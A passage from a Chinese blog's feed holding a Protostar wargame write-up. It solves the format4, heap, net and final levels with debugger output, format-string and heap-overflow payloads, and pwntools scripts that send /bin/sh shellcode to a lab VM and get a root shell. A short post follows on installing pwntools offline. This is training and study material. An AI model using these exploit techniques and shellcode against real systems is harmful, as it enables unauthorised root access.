class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q format4</span><br><span class="line">Reading symbols from /opt/protostar/bin/format4...done.</span><br><span class="line">(gdb) disas hello</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> hello:</span><br><span class="line">0x080484b4 &lt;hello+0&gt;:   push   %ebp</span><br><span class="line">0x080484b5 &lt;hello+1&gt;:   mov    %esp,%ebp</span><br><span class="line">0x080484b7 &lt;hello+3&gt;:   sub    <span class="variable">$0x18</span>,%esp</span><br><span class="line">0x080484ba &lt;hello+6&gt;:   movl   <span class="variable">$0x80485f0</span>,(%esp)</span><br><span class="line">0x080484c1 &lt;hello+13&gt;:  call   0x80483dc &lt;puts@plt&gt;</span><br><span class="line">0x080484c6 &lt;hello+18&gt;:  movl   <span class="variable">$0x1</span>,(%esp)</span><br><span class="line">0x080484cd &lt;hello+25&gt;:  call   0x80483bc &lt;_exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) quit</span><br><span class="line">$ objdump -TR format4</span><br><span class="line"></span><br><span class="line">format4:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC SYMBOL TABLE:</span><br><span class="line">00000000  w   D  *UND*  00000000              __gmon_start__</span><br><span class="line">00000000      DF *UND*  00000000  GLIBC_2.0   fgets</span><br><span class="line">00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main</span><br><span class="line">00000000      DF *UND*  00000000  GLIBC_2.0   _exit</span><br><span class="line">00000000      DF *UND*  00000000  GLIBC_2.0   <span class="built_in">printf</span></span><br><span class="line">00000000      DF *UND*  00000000  GLIBC_2.0   puts</span><br><span class="line">00000000      DF *UND*  00000000  GLIBC_2.0   <span class="built_in">exit</span></span><br><span class="line">080485ec g    DO .rodata        00000004  Base        _IO_stdin_used</span><br><span class="line">08049730 g    DO .bss   00000004  GLIBC_2.0   stdin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE</span><br><span class="line">080496fc R_386_GLOB_DAT    __gmon_start__</span><br><span class="line">08049730 R_386_COPY        stdin</span><br><span class="line">0804970c R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line">08049710 R_386_JUMP_SLOT   fgets</span><br><span class="line">08049714 R_386_JUMP_SLOT   __libc_start_main</span><br><span class="line">08049718 R_386_JUMP_SLOT   _exit</span><br><span class="line">0804971c R_386_JUMP_SLOT   <span class="built_in">printf</span></span><br><span class="line">08049720 R_386_JUMP_SLOT   puts</span><br><span class="line">08049724 R_386_JUMP_SLOT   <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">$ objdump -t format4 | grep hello</span><br><span class="line">080484b4 g     F .text  0000001e              hello</span><br><span class="line">$ i=0; <span class="keyword">while</span> [ <span class="variable">$i</span> -le 10 ]; <span class="keyword">do</span> i=$((i+1)); python -c <span class="string">"print 'aaaa%%%03d\$08x' % <span class="variable">$i</span>"</span> | ./format4; <span class="keyword">done</span></span><br><span class="line">aaaa00000200</span><br><span class="line">aaaab7fd8420</span><br><span class="line">aaaabffffb14</span><br><span class="line">aaaa61616161</span><br><span class="line">aaaa35303025</span><br><span class="line">aaaa78383024</span><br><span class="line">aaaa0000000a</span><br><span class="line">aaaab7fff524</span><br><span class="line">aaaabffffb70</span><br><span class="line">aaaab7fe35c9</span><br><span class="line">aaaa00000007</span><br><span class="line">(gdb) b *0x0804851a</span><br><span class="line">Breakpoint 1 at 0x804851a: file format4/format4.c, line 27.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /opt/protostar/bin/format4</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main (argc=1, argv=0xbffffd54) at format4/format4.c:27</span><br><span class="line">27      format4/format4.c: No such file or directory.</span><br><span class="line">        <span class="keyword">in</span> format4/format4.c</span><br><span class="line">(gdb) p <span class="built_in">exit</span></span><br><span class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7ec60c0 &lt;*__GI_exit&gt;</span><br><span class="line">(gdb) quit</span><br><span class="line"></span><br><span class="line">$ python -c <span class="string">"print '\x24\x97\x04\x08'+'\x25\x97\x04\x08'+'\x26\x97\x04\x08'+'\x27\x97\x04\x08'+'%164x%4\$n'+'%208x%5\$n'+'%128x%6\$n'+'%260x%7\$n'"</span> | ./format4</span><br><span class="line">$%&amp;<span class="string">'                                                                                                                                                                 200                                                                                                                                                                                                        b7fd8420                                                                                                                        bffffb14                                                                                                                                                                                                                                                             8049724</span></span><br><span class="line"><span class="string">code execution redirected! you win</span></span><br></pre></td></tr></table></figure><h1 id="Heap-0"><a href="#Heap-0" class="headerlink" title="Heap 0"></a>Heap 0</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -t heap0 | grep winner</span><br><span class="line">08048464 g     F .text  00000014              winner</span><br><span class="line">08048478 g     F .text  00000014              nowinner</span><br><span class="line">$ ./heap0 `python -c <span class="string">"print 'a'*72+'\x64\x84\x04\x08'"</span>`</span><br><span class="line">data is at 0x804a008, fp is at 0x804a050</span><br><span class="line">level passed</span><br></pre></td></tr></table></figure><h1 id="Heap-1"><a href="#Heap-1" class="headerlink" title="Heap 1"></a>Heap 1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ ltrace ./heap1 1234 1234</span><br><span class="line">__libc_start_main(0x80484b9, 3, 0xbffffd84, 0x8048580, 0x8048570 &lt;unfinished ...&gt;</span><br><span class="line">malloc(8)                                             = 0x0804a008</span><br><span class="line">malloc(8)                                             = 0x0804a018</span><br><span class="line">malloc(8)                                             = 0x0804a028</span><br><span class="line">malloc(8)                                             = 0x0804a038</span><br><span class="line">strcpy(0x0804a018, <span class="string">"1234"</span>)                            = 0x0804a018</span><br><span class="line">strcpy(0x0804a038, <span class="string">"1234"</span>)                            = 0x0804a038</span><br><span class="line">puts(<span class="string">"and that's a wrap folks!"</span>and that<span class="string">'s a wrap folks!</span></span><br><span class="line"><span class="string">)                      = 25</span></span><br><span class="line"><span class="string">+++ exited (status 25) +++</span></span><br><span class="line"><span class="string">$ objdump -t heap1 | grep winner</span></span><br><span class="line"><span class="string">08048494 g     F .text  00000025              winner</span></span><br><span class="line"><span class="string">$ objdump -TR heap1 | grep puts</span></span><br><span class="line"><span class="string">00000000      DF *UND*  00000000  GLIBC_2.0   puts</span></span><br><span class="line"><span class="string">08049774 R_386_JUMP_SLOT   puts</span></span><br><span class="line"><span class="string">$ ./heap1 `python -c "print '</span>a<span class="string">'*20+'</span>\x74\x97\x04\x08<span class="string">'"` `python -c "print '</span>\x94\x84\x04\x08<span class="string">'"`</span></span><br><span class="line"><span class="string">and we have a winner @ 1532607490</span></span><br></pre></td></tr></table></figure><h1 id="Heap-2"><a href="#Heap-2" class="headerlink" title="Heap 2"></a>Heap 2</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./heap2</span><br><span class="line">[ auth = (nil), service = (nil) ]</span><br><span class="line">auth wang</span><br><span class="line">[ auth = 0x804c008, service = (nil) ]</span><br><span class="line">reset</span><br><span class="line">[ auth = 0x804c008, service = (nil) ]</span><br><span class="line">serviceaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">[ auth = 0x804c008, service = 0x804c018 ]</span><br><span class="line">login</span><br><span class="line">you have logged <span class="keyword">in</span> already!</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'auth '+'a'*30;print 'reset';print 'service'+'a'*33;print 'login'"</span> | ./heap2</span><br><span class="line">[ auth = (nil), service = (nil) ]</span><br><span class="line">[ auth = 0x804c008, service = (nil) ]</span><br><span class="line">[ auth = 0x804c008, service = (nil) ]</span><br><span class="line">[ auth = 0x804c008, service = 0x804c018 ]</span><br><span class="line">you have logged <span class="keyword">in</span> already!</span><br><span class="line">[ auth = 0x804c008, service = 0x804c018 ]</span><br><span class="line">$ python -c <span class="string">"print 'auth ';print 'service'+'a'*17;print 'login'"</span> | ./heap2</span><br><span class="line">[ auth = (nil), service = (nil) ]</span><br><span class="line">[ auth = 0x804c008, service = (nil) ]</span><br><span class="line">[ auth = 0x804c008, service = 0x804c018 ]</span><br><span class="line">you have logged <span class="keyword">in</span> already!</span><br><span class="line">[ auth = 0x804c008, service = 0x804c018 ]</span><br></pre></td></tr></table></figure><h1 id="Heap-3"><a href="#Heap-3" class="headerlink" title="Heap 3"></a>Heap 3</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">$ ltrace ./heap3 aaaa aaaa aaaa</span><br><span class="line">__libc_start_main(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 &lt;unfinished ...&gt;</span><br><span class="line">sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c)     = 4096</span><br><span class="line">sbrk(4096)                                             = 0x0804c000</span><br><span class="line">sbrk(0)                                                = 0x0804d000</span><br><span class="line">strcpy(0x0804c008, <span class="string">"aaaa"</span>)                             = 0x0804c008</span><br><span class="line">strcpy(0x0804c030, <span class="string">"aaaa"</span>)                             = 0x0804c030</span><br><span class="line">strcpy(0x0804c058, <span class="string">"aaaa"</span>)                             = 0x0804c058</span><br><span class="line">puts(<span class="string">"dynamite failed?"</span>dynamite failed?</span><br><span class="line">)           </span><br><span class="line">$ ltrace -S ./heap3 aaaa aaaa aaaa</span><br><span class="line">SYS_brk(NULL)                                          = 0x0804c000</span><br><span class="line">SYS_fcntl64(0, 1, 0, 0, 0xb7ffeff4)                    = 0</span><br><span class="line">SYS_fcntl64(1, 1, 0, 1, 0xb7ffeff4)                    = 0</span><br><span class="line">SYS_fcntl64(2, 1, 0, 2, 0xb7ffeff4)                    = 0</span><br><span class="line">SYS_access(<span class="string">"/etc/suid-debug"</span>, 00)                      = -2</span><br><span class="line">SYS_access(<span class="string">"/etc/ld.so.nohwcap"</span>, 00)                   = -2</span><br><span class="line">SYS_mmap2(0, 8192, 3, 34, -1)                          = 0xb7fe0000</span><br><span class="line">SYS_access(<span class="string">"/etc/ld.so.preload"</span>, 04)                   = -2</span><br><span class="line">SYS_open(<span class="string">"/etc/ld.so.cache"</span>, 0, 00)                    = 3</span><br><span class="line">SYS_fstat64(3, 0xbffff6b4, 0xb7ffeff4, 0xb7fff87c, 3)  = 0</span><br><span class="line">SYS_mmap2(0, 13796, 1, 2, 3)                           = 0xb7fdc000</span><br><span class="line">SYS_close(3)                                           = 0</span><br><span class="line">SYS_access(<span class="string">"/etc/ld.so.nohwcap"</span>, 00)                   = -2</span><br><span class="line">SYS_open(<span class="string">"/lib/libc.so.6"</span>, 0, 00)                      = 3</span><br><span class="line">SYS_read(3, <span class="string">"\177ELF\001\001\001"</span>, 512)                = 512</span><br><span class="line">SYS_fstat64(3, 0xbffff700, 0xb7ffeff4, 0xb7fdf21d, 0x804849c) = 0</span><br><span class="line">SYS_mmap2(0, 0x144948, 5, 2050, 3)                     = 0xb7e97000</span><br><span class="line">SYS_mprotect(0xb7fd5000, 4096, 0)                      = 0</span><br><span class="line">SYS_mmap2(0xb7fd6000, 12288, 3, 2066, 3)               = 0xb7fd6000</span><br><span class="line">SYS_mmap2(0xb7fd9000, 10568, 3, 50, -1)                = 0xb7fd9000</span><br><span class="line">SYS_close(3)                                           = 0</span><br><span class="line">SYS_mmap2(0, 4096, 3, 34, -1)                          = 0xb7e96000</span><br><span class="line">SYS_set_thread_area(0xbffffba0, 0xb7ffeff4, 0xb7e966c0, 1, 0) = 0</span><br><span class="line">SYS_mprotect(0xb7fd6000, 8192, 1)                      = 0</span><br><span class="line">SYS_mprotect(0xb7ffe000, 4096, 1)                      = 0</span><br><span class="line">SYS_munmap(0xb7fdc000, 13796)                          = 0</span><br><span class="line">__libc_start_main(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 &lt;unfinished ...&gt;</span><br><span class="line">sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c)     = 4096</span><br><span class="line">sbrk(4096 &lt;unfinished ...&gt;</span><br><span class="line">SYS_brk(NULL)                                          = 0x0804c000</span><br><span class="line">SYS_brk(0x0804d000)                                    = 0x0804d000</span><br><span class="line">&lt;... sbrk resumed&gt; )                                   = 0x0804c000</span><br><span class="line">sbrk(0)                                                = 0x0804d000</span><br><span class="line">strcpy(0x0804c008, <span class="string">"aaaa"</span>)                             = 0x0804c008</span><br><span class="line">strcpy(0x0804c030, <span class="string">"aaaa"</span>)                             = 0x0804c030</span><br><span class="line">strcpy(0x0804c058, <span class="string">"aaaa"</span>)                             = 0x0804c058</span><br><span class="line">puts(<span class="string">"dynamite failed?"</span> &lt;unfinished ...&gt;</span><br><span class="line">SYS_fstat64(1, 0xbffffb98, 0xb7fd7ff4, 0xb7fd84c0, 0x804ac27) = 0</span><br><span class="line">SYS_mmap2(0, 4096, 3, 34, -1)                          = 0xb7fdf000</span><br><span class="line">SYS_write(1, <span class="string">"dynamite failed?\n"</span>, 17dynamite failed?</span><br><span class="line">)                 = 17</span><br><span class="line">&lt;... puts resumed&gt; )                                   = 17</span><br><span class="line">SYS_exit_group(17 &lt;no <span class="built_in">return</span> ...&gt;</span><br><span class="line">+++ exited (status 17) +++</span><br><span class="line">$ objdump -tTR heap3 | grep winner</span><br><span class="line">08048864 g     F .text  00000025              winner</span><br><span class="line">$ objdump -tTR heap3 | grep puts</span><br><span class="line">00000000       F *UND*  00000000              puts@@GLIBC_2.0</span><br><span class="line">00000000      DF *UND*  00000000  GLIBC_2.0   puts</span><br><span class="line">0804b128 R_386_JUMP_SLOT   puts</span><br><span class="line">$ ./heap3 `python -c <span class="string">'print "\x90"*14 + "\x68\x64\x88\x04\x08\xc3" + "A"*12 + "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff"'</span>` `python -c <span class="string">'print "\xde\xad\xbe\xef"*2+"\x1c\xb1\x04\x08"+"\x08\xc0\x04\x08"'</span>` C</span><br><span class="line">that wasn<span class="string">'t too bad now, was it? @ 1532745821</span></span><br></pre></td></tr></table></figure><h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><p><a href="http://turingh.github.io/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/" target="_blank" rel="noopener">图解DWORDSHOOT</a></p><p><a href="http://turingh.github.io/2015/12/14/protostar-heap3/" target="_blank" rel="noopener">protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法</a></p><h1 id="Net-0"><a href="#Net-0" class="headerlink" title="Net 0"></a>Net 0</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"192.168.116.137"</span>, <span class="number">2999</span>)</span><br><span class="line">s = r.recv()</span><br><span class="line">pos = s.find(<span class="string">"\'"</span>, <span class="number">13</span>)</span><br><span class="line">num = int(s[<span class="number">13</span>:pos])</span><br><span class="line">r.sendline(p32(num))</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br></pre></td></tr></table></figure><h1 id="Net-1"><a href="#Net-1" class="headerlink" title="Net 1"></a>Net 1</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"192.168.116.137"</span>, <span class="number">2998</span>)</span><br><span class="line">s = r.recv()</span><br><span class="line"><span class="comment"># print s</span></span><br><span class="line">num = struct.unpack(<span class="string">"I"</span>, s)</span><br><span class="line"><span class="comment"># print num</span></span><br><span class="line">r.sendline(str(num[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br></pre></td></tr></table></figure><h1 id="Net-2"><a href="#Net-2" class="headerlink" title="Net 2"></a>Net 2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"192.168.116.137"</span>, <span class="number">2997</span>)</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">  s = r.recv(<span class="number">4</span>)</span><br><span class="line">  num += int(struct.unpack(<span class="string">"&lt;I"</span>, s)[<span class="number">0</span>])</span><br><span class="line">num &amp;= <span class="number">0xffffffff</span></span><br><span class="line">r.sendline(p32(num))</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br></pre></td></tr></table></figure><h1 id="Final-0"><a href="#Final-0" class="headerlink" title="Final 0"></a>Final 0</h1><p>首先用栈溢出获得core file，然后objdump获得buffer起始地址，因为gets对\x00读取并没问题，直接用\x00截断，shellcode，junk，retaddr</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"192.168.116.137"</span>, <span class="number">2995</span>)</span><br><span class="line">shellcode = <span class="string">'\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'</span></span><br><span class="line">payload = <span class="string">'\x00'</span>+ shellcode + <span class="string">'\x90'</span>*(<span class="number">532</span>-len(shellcode)<span class="number">-1</span>)+p32(<span class="number">0xbffffa49</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/Protostar<span class="comment"># python final0.py </span></span><br><span class="line">[+] Opening connection to 192.168.116.137 on port 2995: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h1 id="Final-1"><a href="#Final-1" class="headerlink" title="Final 1"></a>Final 1</h1><p>syslog原型为<code>void syslog(int priority, const char *format, ...);</code>看第二个参数名字就懂了吧，查看需要在有权限的情况下看<code>/var/log/syslog</code>文件</p><p>然后就是尝试咯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -tTR final1 | grep puts</span><br><span class="line">00000000       F *UND*  00000000              puts@@GLIBC_2.0</span><br><span class="line">00000000      DF *UND*  00000000  GLIBC_2.0   puts</span><br><span class="line">0804a194 R_386_JUMP_SLOT   puts</span><br><span class="line">$ objdump -tTR final1 | grep username</span><br><span class="line">0804a220 g     O .bss   00000080              username</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'</span></span><br><span class="line">ret = <span class="number">0x0804a194</span></span><br><span class="line">payload = shellcode+<span class="string">'\x90'</span>*<span class="number">2</span>+p32(ret)+p32(ret+<span class="number">1</span>)+p32(ret+<span class="number">2</span>)+p32(ret+<span class="number">3</span>)+<span class="string">'%24$01968d'</span>+<span class="string">'%26$hn'</span>+<span class="string">'%24$039452d'</span>+<span class="string">'%24$hn'</span></span><br><span class="line">r = remote(<span class="string">"192.168.116.137"</span>, <span class="number">2994</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"username "</span>+payload)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"login "</span>+<span class="string">" "</span>*<span class="number">24</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/Protostar<span class="comment"># python final1.py </span></span><br><span class="line">[+] Opening connection to 192.168.116.137 on port 2994: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h1 id="Final-2"><a href="#Final-2" class="headerlink" title="Final 2"></a>Final 2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"192.168.116.137"</span>, <span class="number">2993</span>)</span><br><span class="line">r.send(<span class="string">"FSRD"</span> + <span class="string">"A"</span>*(<span class="number">128</span><span class="number">-4</span><span class="number">-1</span>) + <span class="string">"/"</span>)  </span><br><span class="line">r.sendline(<span class="string">"FSRD"</span> + <span class="string">"ROOT"</span> + <span class="string">"\x90"</span>*(<span class="number">128</span>-len(shellcode)<span class="number">-4</span><span class="number">-4</span><span class="number">-1</span><span class="number">-4</span><span class="number">-4</span><span class="number">-4</span><span class="number">-4</span>) + shellcode + <span class="string">"/"</span> + <span class="string">"\xfc\xff\xff\xff"</span> + <span class="string">"\xfc\xff\xff\xff"</span> + <span class="string">"\x10\xd4\x04\x08"</span> + <span class="string">"\x98\xe0\x04\x08"</span> )</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/Protostar<span class="comment"># python final2.py </span></span><br><span class="line">[+] Opening connection to 192.168.116.137 on port 2993: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Process OK</span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> WARGAME </tag>
            
            <tag> stackoverflow </tag>
            
            <tag> formatstring </tag>
            
            <tag> heapoverflow </tag>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>在pip连不上网的时候安装pwntools</title>
      <link href="/%E5%9C%A8pip%E8%BF%9E%E4%B8%8D%E4%B8%8A%E7%BD%91%E7%9A%84%E6%97%B6%E5%80%99%E5%AE%89%E8%A3%85pwntools/"/>
      <url>/%E5%9C%A8pip%E8%BF%9E%E4%B8%8D%E4%B8%8A%E7%BD%91%E7%9A%84%E6%97%B6%E5%80%99%E5%AE%89%E8%A3%85pwntools/</url>
      <content type="html"><![CDATA[<p>本文描述了这样一种特殊情况下安装pwntools的解决方案：有方法联网，但是pip连不上网。 </p><a id="more"></a><p>解决方法很简单，就是将pwntools和其依赖包下载下来，然后手动安装。选择对应版本，有whl直接下载whl，没有就下载源代码用命令python setup install安装，安装的时候可能会遇到有预先依赖，那就先安装依赖的包就行。 </p><p>下图是我在2018年7月22日下载的一套，有需要的度盘链接：<a href="https://pan.baidu.com/s/1efC82WX_TdAMoS7aVBFi1w" target="_blank" rel="noopener">https://pan.baidu.com/s/1efC82WX_TdAMoS7aVBFi1w</a> 密码：lnv8</p><img src="/在pip连不上网的时候安装pwntools/1532396878037.png" title="压缩包"><p>安装效果如下图</p><img src="/在pip连不上网的时候安装pwntools/1532397057219.png" title="安装效果">]]></content>
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CTF用环境搭建</title>
      <link href="/CTF%E7%94%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
